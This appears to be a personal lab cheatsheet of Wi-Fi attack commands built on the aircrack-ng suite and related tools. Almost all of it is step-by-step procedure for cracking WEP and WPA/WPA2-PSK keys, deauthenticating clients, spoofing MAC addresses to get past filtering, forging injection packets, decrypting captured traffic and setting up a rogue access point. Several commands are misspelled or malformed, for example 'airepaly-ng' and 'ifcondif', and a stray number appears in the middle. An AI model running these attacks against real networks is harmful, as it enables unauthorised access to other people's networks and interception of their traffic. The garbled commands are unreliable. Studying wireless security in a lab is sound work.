Commands cheatsheet:
	-	Alfa AWUS036H issue:
		-	Check for the issue:
			#dmesg |tail -5

			if the output is the below:
				Registered led device: rtl8187-phy0::radio 
				Registered led device: rtl8187-phy0::tx 
				Registered led device: 
				rtl8187-phy0::rx rtl8187: wireless switch is on
				rtl8187: wireless radio switch turned off

		-	Solution
				#touch alfa.sh
				#nano alfa.sh
					#!/bin/sh
					rmmod rtl8187
					rfkill block all
					rfkill unblock all
					modprobe rtl8187
					rfkill unblock all
					ifconfig wlan0 up
				#chmod +x alfa.sh
				#./alfa.sh

	-	Drivers Loading Issue:
		-	Check if the mac20811 is loaded:
			#iw list

			if failed, so ieee80211 is loaded
		-	Solution:
			#rmmod r8187
			#modprobe rtl8187
			#iwconfig
			#iw list

	-	IEEE80211 Monitor Mode:
		-	Put the interface in Monitor mode
			#iwconfig wlan0 mode monitor

		-	Get list of all access points within the range of the wireless card with its channel
			#iw dev <Mon_Interface> scan | egrep "ESSID|Channel"

	-	Mac80211 Monitoring Mode:
		-	Get allowed Frequencies
				#iwlist wlan0 frequency

		-	Create VAP
				#iw dev wlan0 interface add mon0 type monitor
				#ifconfig mon0 up

		-	Remove VAP
				#iw dev mon0 interface del

		-	Get all supported frequencies with the channels
				#iwlist <Mon_Interface> frequency

		-	Get list of all access points within the range of the wireless card
				#iw dev interface <Mon_Interface> scan | grep SSID

		-	Get list of all access points within the range of the wireless card with its channel
				#iw dev <Mon_Interface> scan | egrep "DS\ Parameter\ Set|SSID"

	-	Airmon-ng
		-	Show all wireless interfaces with its details
				#airmon-ng
		-	Create new monitor mode interface
				#airmon-ng start wlan0

		-	Create monitor mode on specific channel
				#airmon-ng start wlan0 3

		-	Check the current monitor mode channel
				#iwlist mon0 channel

		-	Delete existing monitor mode interface
				#airmon-ng stop mon0
	-	Airodump-ng
		-	General Sniffing
				#airodump-ng mon0

		-	Sniffing specific AP traffic
				#airodump-ng --channel <AP_Channel> --bssid <AP_MAC> -w <Capture_File-name> <Mon_Interface>

		-	Capturing IVs for WEP network
				#airodump-ng --channel <AP_Channel> --bssid <AP_MAC> -w <Capture_file-name> --ivs <Mon_Interface>

	-	Aireplay-ng
		-	General usage
				#aireplay-ng <options> <Interface_name>
		-	Injection Test
				#aireplay-ng -9 <Mon_Interface>

		-	Injection Test for Targeted ESSID --> monitor interface has to be in the same channel of the target ESSID
				#aireplay-ng -9 -e <ESSID> -a <AP_MAC> -i <Mon_Interface>

		-	Card-to-Card Injection test
				#aireplay-ng -9 -i <wlan1> <mon0>

				mon0 --> Trnsmitter
				wlan1 --> Receiver

	-	Crack WEP with Connected Clients
		-	Initials Attack Setup
			-	Airmon-ng
					#airmon-ng start <interface_name>
					#airodump-ng <Mon_interface>
						--> Get the channel of the target ESSID
					#airmon-ng stop <Mon_interface>
					#airmon-ng start <interface_name> <channel_num>

			-	Airodump-ng
					#airodump-ng -c <channel> --bssid <AP_MAC> -w <filename> <Mon_interface>

		-	Fake Authentication Attack					
			-	Aireplay-ng
				It there is no connected clients 
					#aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAc> <Mon_interface>

				-	Bypass Open Networks with MAC filtering enabled
					1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Obtain a valid associated MAC address
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> <Mon_interface>
						get the associated MAC addresses and wait some of them to leave the network.
							#CRTL-C

					3.	Change the MAC address of the wireless card with the valid obtained and leaved MAC address
							#ifconfig <Mon_interface> down
							#macchanger -m <Obtained_MAC-address> <Mon_interface>
							#ifconfig <mon_interface> up

					4.	Fake authrication using the obtained and leaved MAC address
						Run Airodump-ng to verify the attack result
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> <Mon_interface>

						Run the Attack
							#airepaly-ng -1 0 -e <Targeted_ESSID> -a <AP_MAC> -h <Obtained_MAC-address> <Mon_interface>
							after successfully authenticated and verified from the Airodump-ng output
							CRTL-C

						Reset the Interface MAC address
							#macchanger -p wlan0mon
		-	Deauthentication Attack
			-	Aireplay-ng
				Send disassociatation packet for one or moare wireless clients currently connected to the targeted AP
					#aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <Mon_interface>

		-	ARP Replay Attack
			-	General usage
					#aireplay -3 -b <AP_Mac> -h <Source_MAC> <Mon_interface>
						<Source_MAC> can be either MAC address of already authenticated client or the self MAC address while doing Fake Authentication
18626.27
				-	Steps
					1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Run Airodump-ng to capture the weak IVs and Fake Authentication->(if only WEP):
							Run Airodump-ng to verify the attack result
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> -w <Capture_file> <Mon_interface> 

							Run the fake authentication
							#airepaly-ng -1 0 -e <Targeted_ESSID> -a <AP_MAC> -h <Mon_interface_MAC-address> <Mon_interface>
							
					3.	Run ARP Request Replay Attack:
							#aireplay-ng -3 -b <AP_MAC> -h <Mon_interface_MAC-address> <Mon_interface>

					4.	Run Deauthentication against any authenticated clients to generate ARP:
							#aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <Mon_interface>

					5.	Run Aircrack-ng 
							if (IVs % 5000) == 0 :
								#aircrack-ng -0 -z -n 64 <Capture_file>
							else :
								#aircrack-ng -0 -z  <Capture_file>
	-	Crack WEP via client
		-	Natural Packet Replay Attack   --> very effective in the Lab!
			-	General Usage
					#aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 <interface>
					for getting packet Broadcast (FF:FF:FF:FF:FF:FF) ARP Packet from wireless network to wired network with ToDS bit set to 1
					type Y to use this packet in the attack

				-	Steps
					1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Run Airodump-ng to capture the weak IVs and Fake Authentication->(if only WEP):
							Run Airodump-ng to verify the attack result
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> -w <Capture_file><Mon_interface>

					3.	Run the fake authentication --> for Attack reliability
							#airepaly-ng -1 0 -e <Targeted_ESSID> -a <AP_MAC> -h <Mon_interface_MAC-address> <Mon_interface>

					4.	Run Aireplay-ng to capture a packet to be replayed
							#aireplay-ng -2 -b <AP_MAC> -d FF:FF:FF:FF:FF:FF -t 1 <Mon_interface>

					5.	Run Aircrack-ng to crack the collected weak IVs, but wait to exceed 5000 IVs
							if (IVs % 5000) == 0 :
								#aircrack-ng -0 -z -n 64 <Capture_file>
							else :
								#aircrack-ng -0 -z  <Capture_file>

		-	Modified Packet Replay 
			-	General Usage
					#aireplay-ng -2 -b <AP MAC> -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 <Mon_interface>
					for getting an packet which is going to the distribution system (ToDS bit set to 1), and will modify the Frame Control Field to be 1, so the packet appears to come from client and modeify the destination MAC address to be broadcast (FF:FF:FF:FF:FF:FF)

				-	Steps
					1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Run Airodump-ng to capture the weak IVs and Fake Authentication->(if only WEP):
							Run Airodump-ng to verify the attack result
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> -w <Capture_file><Mon_interface>

					3.	Run the fake authentication --> for Attack reliability
							#airepaly-ng -1 0 -e <Targeted_ESSID> -a <AP_MAC> -h <Mon_interface_MAC-address> <Mon_interface>

					4.	Run Aireplay-ng to capture a packet to be replayed
							#aireplay-ng -2 -b <AP_MAC>  -c FF:FF:FF:FF:FF:FF -t 1 -p 0841 <Mon_interface>

					5.	Run Aircrack-ng to crack the collected weak IVs, but wait to exceed 5000 IVs
							if (IVs % 5000) == 0 :
								#aircrack-ng -0 -z -n 64 <Capture_file>
							else :
								#aircrack-ng -0 -z  <Capture_file>

		- 	Interactive Packet Replay   ---> Most Common use!
			-	General Usage
					#aireplay-ng -2 -b <AP_MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <Mon_interface>
					for getting packet orgniated from Wired network (FromDS set to 1) and the minimum and maximum sized (68 and 86) for getting ARP packet and broadcasted (dest MAC FF:FF:FF:FF:FF:FF)

			-	Injecting a saved packets file
				#aireplay-ng -2 -r <Capture_file> <Mon_interface>

				-	Steps
					1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Run Airodump-ng to capture the weak IVs and Fake Authentication->(if only WEP):
							Run Airodump-ng to verify the attack result
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> -w <Capture_file><Mon_interface>

					3.	Run the fake authentication --> for Attack reliability
							#airepaly-ng -1 0 -e <Targeted_ESSID> -a <AP_MAC> -h <Mon_interface_MAC-address> <Mon_interface>

					4.	Run Aireplay-ng to capture a packet to be replayed
							#aireplay-ng -2 -b <AP_MAC>  -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <Mon_interface>

					5.	Run Aircrack-ng to crack the collected weak IVs, but wait to exceed 5000 IVs
							if (IVs % 5000) == 0 :
								#aircrack-ng -0 -z -n 64 <Capture_file>
							else :
								#aircrack-ng -0 -z  <Capture_file>


	-	Crack WEP network - Clientless (attack 4 - aireplay-ng -4)	--> Open Authentication, Slow, doest work with all AP
		-	The KoreK ChopChop
			-	Steps
				1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Run Airodump-ng to capture the weak IVs and Fake Authentication->(if only WEP):
							Run Airodump-ng to verify the attack result
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> -w <Capture_file><Mon_interface> 

							Run the fake authentication
							#airepaly-ng -1 6000 -o 1 -q 10 -e <Targeted_ESSID> -a <AP_MAC> -h <Mon_interface_MAC-address> <Mon_interface>

					3.	Run the ChopChop attack
							#aireplay-ng -4 -b <AP_MAC> -h <Mon_interface_MAC> <Mon_interface>

					4.	Check the Generated Packet
						-	Use tcpdump
								#tcpdump -n -vvv -s0 -e -r <packet_file>
								Get the <Src_IP> from the decrepted packet

					5.	Create the packet using packetforge-ng
						-	Create ARP Request packet
								#packetforge-ng --arp -b <AP_MAC> -h <Mon_interface-MAC> -y <captured_PRGA>.xor -w <arp_request_packet-file> -k <Dest_IP> -l <Src_IP>

								Src_IP	-->	from the decrypted packet
								Dest_IP	-->	can be a broadcast address 192.168.1.255

						-	Create LLC NULL packet 
								#packetforge-ng --null -s 42 -a <AP_MAC> -h <Mon_interface-MAC> -y <captured_PRGA>.xor -w <NULL_packet-file> -k <Dest_IP> -l <Src_IP>

					6.	Inject the Generated packet to get more Weak IVs
						-	Use Aireplay-ng  Interactive Packet Injection attack
								#aireplay-ng -2 -r <Packet_File> <Mon_interface

					7.	Run Aircrack-ng
							#aircrack-ng -0 <Capture_file>.cap


		-	The Fragmentation attack (attack 5 - aireplay-ng -5)	-->	Open Authentication, Fast, need IP schema information
			-	General Usage
					#aireplay-ng -5 -b <AP_MAC> -h <Your MAC> <interface>

			-	Steps
				1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Run Airodump-ng to capture the weak IVs and Fake Authentication->(if only WEP):
							Run Airodump-ng to verify the attack result
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> -w <Capture_file><Mon_interface> 

							Run the fake authentication
							#airepaly-ng -1 6000 -o 1 -q 10 -e <Targeted_ESSID> -a <AP_MAC> -h <Mon_interface_MAC-address> <Mon_interface>

					3.	Run the Fragmentation attack
							#aireplay-ng -5 -b <AP_MAC> -h <Mon_interface_MAC> <Mon_interface>

					4.	Create the packet using packetforge-ng
						-	Create ARP Request packet
								#packetforge-ng --arp -b <AP_MAC> -h <Mon_interface-MAC> -y <captured_PRGA>.xor -w <arp_request_packet-file> -k <Dest_IP> -l <Src_IP>

								Src_IP	-->	can be any valid IP address, 192.168.1.100
								Dest_IP	-->	can be a broadcast address 192.168.1.255

						-	Create LLC NULL packet 
								#packetforge-ng --null -s 42 -a <AP_MAC> -h <Mon_interface-MAC> -y <captured_PRGA>.xor -w <NULL_packet-file> -k <Dest_IP> -l <Src_IP>

					5.	Check the Generated Packet
						-	Use tcpdump
								#tcpdump -n -vvv -s0 -e -r <packet_file>

						-	use Airdecap-ng --> to decrypt a WEP packet and verify it
								#airdecap-ng -e <ESSID> -w <WEP_Key> <Packet_File>

						-	use tcpdump to check the decrypted packet
								#tcpdump -n -vvv -s0 -e -r <packet_file>-dec

					6.	Inject the Generated packet to get more Weak IVs
						-	Use Aireplay-ng  Interactive Packet Injection attack
								#aireplay-ng -2 -r <Packet_File> <Mon_interface

					7.	Run Aircrack-ng
							#aircrack-ng -0 <Capture_file>.cap

	-	Cracking WEP with clients - Shared Key Authentication
		-	Steps
			1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

			2.	Run Airodump-ng to capture the weak IVs and Fake Authentication->(if only WEP):
					Run Airodump-ng to verify the attack result
					#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> -w <Capture_file><Mon_interface> 

					Run the fake authentication
					#airepaly-ng -1 6000 -o 1 -q 10 -e <Targeted_ESSID> -a <AP_MAC> -h <Mon_interface_MAC-address> <Mon_interface>

			3.	Run Deauthentication against any authenticated clients to generate ARP:
					#aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <Mon_interface>

			4.	Run Fake Authentication with the captured XOR file
					#airepaly-ng -1 6000 -o 1 -q 10 -e <Targeted_ESSID> -a <AP_MAC> -h <Mon_interface_MAC-address> -y <Capture_file>.xor <Mon_interface>

			5.	Run ARP Request Replay Attack
					#aireplay -3 -b <AP_MAC> -h <Mon_interface-MAC> <Mon_interface>

			6.	Run Deauthentication against any authenticated clients to generate ARP:
					#aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <Mon_interface>

			7.	Run Aircrack-ng 
					if (IVs % 5000) == 0 :
						#aircrack-ng -0 -z -n 64 <Capture_file>
					else :
						#aircrack-ng -0 -z  <Capture_file>
	-	Cracking WPA/WPA2-PSK with connected clients
		-	Steps
			1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

			2.	Run Airodump-ng to capture the weak IVs and Fake Authentication->(if only WEP):
					Run Airodump-ng to verify the attack result
					#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> -w <Capture_file><Mon_interface> 

			3.	Run Deauthentication against any authenticated clients to gain WPA handshake:
					#aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <Mon_interface>

		-	Cracking WPA/WPA2-PSK using just Aircrack-ng
			-	Steps
				1.	Run Aircrack-ng to crack the password using wordlist
						#aircrack-ng -w <path/to/wordlist> <Capture_file>

		-	Cracking WPA with PMK DB 	-->	Airolib-ng 
			-	Steps
				1.	Creating the DB and adding the ESSID file and wordlist file
						#airolib-ng <DB_Name> --import essid <essids_file>
						#airolib-ng <DB_Name> --import passwd <wordlist_file>

				2.	Creating the PMK for the created DB
						#airolib-ng <DB_Name> --batch
						#airolib-ng <DB_Name> --stats

				3.	Using airolib-ng DB for cracking the WPA
						#aircrack-ng -r <DB_Name> <Capture_file>

		-	Cracking WPA with JTR
			-	Steps
				1.	Change the rules to mugle the wordlist by adding 3 digits after it for example
						#nano /usr/share/john/john.conf
						CRTL+W --> for Searching function and Search for List.Rules:Wordlist, then go to the end of the rules and add the below
						$[0-9]$[0-9]   #to add two digits after the word
						$[0-9]$[0-9]$[0-9]	#to add 3 digits after the word

				2.	Run the aircrack against the output of the wordlist mugling
						#john --wordlist=<Path/to/wordlist> --rules --stdout | aircrack-ng -0 -e <ESSID> -w - <Capture_file>.cap

		-	Cracking WPA with coWPAtty	--> 	Dictionary and Rainbow table attacks
			-	Steps for Dictionary mode, but not recomended as aircrack-ng is 3x faster than it
				1.	Cracking the WPA2-PSK using dictionay mode
						#cowpatty -r <Capture_file>.cap -f <wordlist>  -s <ESSID>

			-	Steps using Raibow table <Pre-computed hashes like Airolib-ng>
				1.	Generate rainbow table for specific unique ESSID
						#genpmk -f <Path/to/wordlist> -d <Hashes_output-file> -s <ESSID>

				2.	Use coWPAtty to crack the key using the generated raibow table <Hashes>
						#cowpatty -r <Capture_file>.cap -s <ESSID> -d <Hashes_output-file> 

		-	Cracking WPA/WPA2 with Pyrit
			-	Sniffing the WPA/WPA2-PSK 4-way handshake directly
				-	Steps
					1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Sniff only the 4-way handshake
							#pyrit -r <Mon_interface> -o <Capture_file>.cap stripLive

					3.	Run Deauthentication against any authenticated clients to generate ARP:
							#aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <Mon_interface>

			-	Crack WPA/WPA2-PSK Dictionary mode using Catpure from Airodump-ng
				-	Steps
					1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Run Airodump-ng to capture the weak IVs and Fake Authentication->(if only WEP):
							Run Airodump-ng to verify the attack result
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> -w <Capture_file><Mon_interface> 

					3.	Run Deauthentication against any authenticated clients to generate ARP:
							#aireplay-ng -0 1 -a <CaAP_MAC> -c <Client_MAC> <Mon_interface>

					4.	Analyzing Capture file
							#pyrit -r <Capture_file>.cap analyze

					5.	Strip only the 4-way handshake from the capture file
							#pyrit -r <Capture_file>.cap -o <New_Striped_Capture-file>.cap strip

					6.	Run Dictiionary attack against 4-way handshake
							#pyrit -r <New_Striped_Capture-file>.cap -i <wordlist> -b <AP_MAC> attack_passthrough

			-	Crack WPA/WPA2-PSK using Pyrit Database mode <Pre-computed hashes>
				-	Steps
					1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Run Airodump-ng to capture the weak IVs and Fake Authentication->(if only WEP):
							Run Airodump-ng to verify the attack result
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> -w <Capture_file><Mon_interface> 

					3.	Run Deauthentication against any authenticated clients to generate ARP:
							#aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <Mon_interface>

					4.	Analyzing Capture file
							#pyrit -r <Capture_file>.cap analyze

					5.	Strip only the 4-way handshake from the capture file
							#pyrit -r <Capture_file>.cap -o <New_Striped_Capture-file>.cap strip

					6.	Import wordlist to the Database
							#pyrit -i <wordlist> import_passwords

					7.	Create new ESSID in the DB
							#pyrit -e <ESSID> create_essid

					8.	Compute PMKs for the created ESSID using the imported passwords
							#pyrit batch

					9.	Launch pyrit Database attack 
							#pyrit -r <New_Striped_Capture-file>.cap -b <AP_MAC> attack_db 

	-	Aircrack-ng Suite tools
		-	Airdecap-ng
			-	Decrypt WEP Encrypted capture file using the key
					#airdecap-ng -b <AP_MAC> -w <Key> <Capture_file>.cap

			-	Decrypting WPA Encrypted capture file using the key
					#airdecap-ng -b <AP_MAC> -e <ESSID> -p <Key>
		
		-	Airserv-ng
			-	Create TCP server for the wireless card over specific port and for specific channel
					#airmon-ng check kill
					#airmon-ng start <Wireless_interface> <Channel>
					#airserv-ng -p <Port> -c <Channel>  -d <Mon_interface>

			-	Using Airodump-ng with the client-server connection 
					#airodump-ng --bssid <AP_MAC> --essid <ESSID> <Mon_Server-IP>:<Port>

		-	Airtun-ng
			-	Live decryption of WEP traffic for specific WEP ESSID
				Steps:
					1.	Place card into monitor mode
							#airmon-ng check kill
							#airmon-ng start <Wireless_interface> <Channel>

					2.	Run Airtun-ng for specific ESSID with knowledge of the WEP key
							#airtun-ng -a <AP_MAC> -w <WEP_Key> <Mon_interface>

					3.	Bring the created interface up to get copy of the wireless traffic
							#ifcondif at0 up

			-	WEP injection
				-	WEP injection using WEP key
					-	Steps:
						1.	Place card into monitor mode
								#airmon-ng check kill
								#airmon-ng start <Wireless_interface> <Channel>

						2.	Run Airtun-ng for specific ESSID with knowledge of the WEP key, -t <ToDS> option to allow to inject traffic to the AP, and <FromDS> is already set to 1 by default
								#airtun-ng -t 1 -a <AP_MAC> -w <WEP_Key> <Mon_interface>

						3.	Bring the created interface up to get copy of the wireless traffic
								#ifcondif at0 <IP/subnet>	up

						4.	Get the at0 interface MAC address
								#macchanger -s at0

						5.	Fake Authentication with the target AP using at0
								#airepaly-ng -1 6000 -o 1  -e <Targeted_ESSID> -a <AP_MAC> -h <at0_MAC-address> <Mon_interface>

				-	WEP injection using PRGA injection
					-	Steps
						1.	Place card into monitor mode
								#airmon-ng check kill
								#airmon-ng start <Wireless_interface> <Channel>

						2.	airtun-ng -a <AP_MAC> -y <captured_PRGA> <Mon_interface>

						3.	Bring the created interface up to get copy of the wireless traffic
								#ifcondif at0 <IP/subnet>	up

						4.	Get the at0 interface MAC address
								#macchanger -s at0

						5.	Fake Authentication with the target AP using at0
								#airepaly-ng -1 6000 -o 1  -e <Targeted_ESSID> -a <AP_MAC> -h <at0_MAC-address> <Mon_interface>

	-	Wireless Reconnaissance
		-	Airgraph-ng
				-	Client-to-AP-Relationship
						#airgraph-ng -i <Capture_file>.csv -g CAPR -o <output_file-name>

				-	Client-Probe-Graph
						#airgraph-ng -i <Capture_file>.csv -g CPG -o <output_file-name>

		-	Kismet
			-	General Usage
					#kismet
					connect to http://<Local_IP>:2501
					From Data Sources --> choose the wireless cards and Enable Monitor

	-	Rogue Access Points
		-	Airbase-ng
			-	WEP ->-e  Shared Key Capture
					#airebase-ng -v <Channel> -e <ESSID> -s -W 1 <Mon_interface>




















